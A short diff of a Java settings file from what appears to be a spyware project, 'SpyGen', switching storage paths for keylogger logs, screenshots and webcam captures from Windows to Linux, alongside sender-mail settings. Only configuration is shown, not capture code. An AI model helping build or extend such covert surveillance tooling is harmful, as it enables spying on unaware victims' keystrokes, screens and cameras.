@@ -4,10 +4,10 @@ import java.io.File;
 
 public class Settings {
     // Path you want to save results
-    public static String savePath = "D:";
-    public static final String KEYLOGGER_PATH = savePath + "\\SpyGen\\keyloggers";
-    public static final String SCREENSHOT_PATH = savePath + "\\SpyGen\\screenshots";
-    public static final String WEBCAM_PATH = savePath + "\\SpyGen\\webcam";
+    public static String savePath = "/home/houari/Desktop/";
+    public static final String KEYLOGGER_PATH = savePath + "SpyGen/keyloggers/";
+    public static final String SCREENSHOT_PATH = savePath + "SpyGen/screenshots/";
+    public static final String WEBCAM_PATH = savePath + "SpyGen/webcam/";
 
     /* Mail information */
     public static String senderMail = "sender@gmail.com";
@@ -19,7 +19,7 @@ public class Settings {
     }
 
     private static void initSaveFolders() {
-        createFolderIfNotExists(savePath + "\\SpyGen");
+        createFolderIfNotExists(savePath + "SpyGen/");
         createFolderIfNotExists(KEYLOGGER_PATH);
         createFolderIfNotExists(SCREENSHOT_PATH);
         createFolderIfNotExists(WEBCAM_PATH);
